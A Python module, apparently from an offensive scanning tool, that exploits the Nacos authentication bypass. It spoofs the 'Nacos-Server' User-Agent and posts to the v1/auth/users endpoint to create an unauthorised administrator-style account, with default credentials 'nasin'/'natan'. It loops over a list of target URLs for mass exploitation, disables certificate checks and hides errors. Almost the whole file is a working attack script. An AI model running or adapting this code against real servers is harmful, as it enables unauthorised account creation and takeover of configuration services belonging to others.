import requests
from moudle import common
import urllib3

# 关闭ssl警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class ApiBypass:
    """
    api未授权添加用户
    """

    def __init__(self, url, userinfo):
        self.url = url
        self.header = {"User-Agent": "Nacos-Server", "Content-Type": "application/x-www-form-urlencoded"}
        self.userinfo = userinfo

    def run(self):
        try:
            self.addUser()
        except Exception as e:
            pass

    def addUser(self):
        """
        添加用户
        """
        configurl = self.url + "v1/auth/users"
        response = requests.post(configurl, headers=self.header, data=self.userinfo, timeout=10, verify=False)
        common.Print(response.text[:50]).info()
        common.Print("\n\n").print()


class Manager:
    def __init__(self, url, uf, username, password):
        self.userinfo = {
            "username": "nasin",
            "password": "natan"
        }
        self.url = url
        self.uf = uf
        self.urls = set()
        if username != None:
            self.userinfo["username"] = username
        if password != None:
            self.userinfo["password"] = password


    def run(self):
        if self.uf is not None:
            common.Print("format url files...").info()
            self.urls = common.common().urls_format(self.uf)
            if len(self.urls) == 0:
                common.Print("文件内容预解析重定向失败").err()
                return
        elif self.url is not None:
            common.Print("format url...").info()
            url = common.common().url_format(self.url)
            self.urls.add(url)

        common.Print("api bypass add user").info()
        for url in self.urls:
            try:
                common.Print("start scan {}".format(url)).info()
                ApiBypass(url, self.userinfo).run()
            except:
                pass
